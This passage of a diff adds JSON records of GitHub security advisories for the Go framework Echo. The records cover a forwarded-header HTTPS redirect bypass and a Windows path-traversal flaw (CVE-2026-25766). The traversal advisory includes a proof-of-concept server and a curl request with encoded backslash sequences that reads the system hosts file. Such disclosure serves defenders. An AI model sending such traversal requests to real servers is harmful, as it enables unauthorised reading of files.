echo.ExtractSchemeFromHeaders(echo.TrustIPRange(proxyRange))`; otherwise `HTTPSRedirect` redirects in a loop. If you cannot upgrade, make sure every request passes through a proxy that overwrites `X-Forwarded-Proto` and removes `X-Forwarded-Protocol`, `X-Forwarded-Ssl` and `X-Url-Scheme`, and that the application cannot be reached directly.\n",
+      "ghsa_id": "GHSA-2ffq-g2xg-c22p",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-2ffq-g2xg-c22p",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-2ffq-g2xg-c22p"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:00Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "HTTPS Redirect and HSTS Bypass via Unconditional Trust of Forwarded Scheme Headers",
+      "updated_at": "2026-09-27T23:04:00Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-2ffq-g2xg-c22p",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.4.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.4.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.16.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.16.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 11,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "shblue21",
+          "type": "reporter"
+        },
+        {
+          "login": "aldas",
+          "type": "remediation_developer"
+        },
+        {
+          "login": "vishr",
+          "type": "remediation_developer"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/25363091?v=4",
+            "events_url": "https://api.github.com/users/shblue21/events{/privacy}",
+            "followers_url": "https://api.github.com/users/shblue21/followers",
+            "following_url": "https://api.github.com/users/shblue21/following{/other_user}",
+            "gists_url": "https://api.github.com/users/shblue21/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/shblue21",
+            "id": 25363091,
+            "login": "shblue21",
+            "node_id": "MDQ6VXNlcjI1MzYzMDkx",
+            "organizations_url": "https://api.github.com/users/shblue21/orgs",
+            "received_events_url": "https://api.github.com/users/shblue21/received_events",
+            "repos_url": "https://api.github.com/users/shblue21/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/shblue21/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/shblue21/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/shblue21",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "remediation_developer",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/2320301?v=4",
+            "events_url": "https://api.github.com/users/aldas/events{/privacy}",
+            "followers_url": "https://api.github.com/users/aldas/followers",
+            "following_url": "https://api.github.com/users/aldas/following{/other_user}",
+            "gists_url": "https://api.github.com/users/aldas/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/aldas",
+            "id": 2320301,
+            "login": "aldas",
+            "node_id": "MDQ6VXNlcjIzMjAzMDE=",
+            "organizations_url": "https://api.github.com/users/aldas/orgs",
+            "received_events_url": "https://api.github.com/users/aldas/received_events",
+            "repos_url": "https://api.github.com/users/aldas/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/aldas/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/aldas/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/aldas",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "remediation_developer",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+            "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+            "followers_url": "https://api.github.com/users/vishr/followers",
+            "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+            "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/vishr",
+            "id": 314036,
+            "login": "vishr",
+            "node_id": "MDQ6VXNlcjMxNDAzNg==",
+            "organizations_url": "https://api.github.com/users/vishr/orgs",
+            "received_events_url": "https://api.github.com/users/vishr/received_events",
+            "repos_url": "https://api.github.com/users/vishr/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/vishr",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-25766",
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [],
+      "cwes": [],
+      "description": "### Summary\r\nOn Windows, Echo’s `middleware.Static` using the default filesystem allows path traversal via backslashes, enabling\r\nunauthenticated remote file read outside the static root.\r\n\r\n### Details  \r\n\r\n  In `middleware/static.go`, the requested path is unescaped and normalized with `path.Clean` (URL semantics).\r\n  `path.Clean` does **not** treat `\\` as a path separator, so `..\\` sequences remain in the cleaned path. The resulting\r\n  path is then passed to `currentFS.Open(...)`. When the filesystem is left at the default (nil), Echo uses `defaultFS`\r\n  which calls `os.Open` (`echo.go:792`). On Windows, `os.Open` treats `\\` as a path separator and resolves `..\\`,\r\n  allowing traversal outside the static root.\r\n\r\n  Relevant code:\r\n  - `middleware/static.go` (path unescape + `path.Clean` + `currentFS.Open`)\r\n  - `echo.go` `defaultFS.Open` → `os.Open`\r\n\r\n  This is the same class as CVE-2020-36565 (fixed in v4 by switching to OS-aware cleaning), but in v5 the `path.Clean`\r\n  + defaultFS combination reintroduces the Windows backslash traversal.\r\n\r\n\r\n### PoC\r\n Windows only.\r\n\r\n  **Sample code (main.go):**\r\n  ```go\r\n  package main\r\n\r\n  import (\r\n        \"log\"\r\n        \"net/http\"\r\n\r\n        \"github.com/labstack/echo/v5\"\r\n        \"github.com/labstack/echo/v5/middleware\"\r\n  )\r\n\r\n  func main() {\r\n        e := echo.New()\r\n\r\n        // Important: use middleware.Static with default filesystem (nil)\r\n        e.Use(middleware.Static(\"public\"))\r\n\r\n        e.GET(\"/healthz\", func(c *echo.Context) error {\r\n                return c.String(http.StatusOK, \"ok\")\r\n        })\r\n\r\n        addr := \":1323\"\r\n        log.Printf(\"listening on %s\", addr)\r\n        if err := e.Start(addr); err != nil && err != http.ErrServerClosed {\r\n                log.Fatal(err)\r\n        }\r\n  }\r\n ```\r\n  Static file:\r\n\r\n  public/index.html\r\n\r\n  (content can be any HTML)\r\n\r\n  **Run:**\r\n  go run .\r\n\r\n  **Verify:**\r\n\r\n  curl http://localhost:1323/index.html\r\n  curl --path-as-is \"http://localhost:1323/..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts\"\r\n  Expected: 404  \r\n\r\n  **Screenshot:**\r\n<img width=\"884\" height=\"689\" alt=\"image\" src=\"https://github.com/user-attachments/assets/acb14d70-2a43-47c1-8927-2f3da491a853\" />\r\n<img width=\"1022\" height=\"162\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f2b92aa2-541e-461d-81a2-8a5907d7a447\" />\r\n\r\n\r\n\r\n  ### Impact\r\n  Path traversal (CWE-22) leading to arbitrary file read outside the static root. Any unauthenticated remote user can\r\n  read local files that the Echo process has access to on Windows, if `middleware.Static` is used with the default\r\n  filesystem.\r\n",
+      "ghsa_id": "GHSA-pgvm-wxw2-hrv9",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-pgvm-wxw2-hrv9",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-pgvm-wxw2-hrv9"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-25766"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-02-17T15:04:59Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Windows path traversal via backslash in middleware.Static default filesystem",
+      "updated_at": "2026-02-17T15:05:00Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-pgvm-wxw2-hrv9",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.0.3",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 5.0.0, < 5.0.3"
+        }
+      ],
+      "withdrawn_at": null
+    }
+  ],
+  "query": {
+    "repository_full_name": "labstack/echo",
+    "url": "https://api.github.com/repos/labstack/echo/security-advisories?per_page=100&page=1"
+  },
+  "retrieved_at": "2026-10-21T13:24:19.015054+00:00",
+  "tool": "github_rest_readonly"
+}
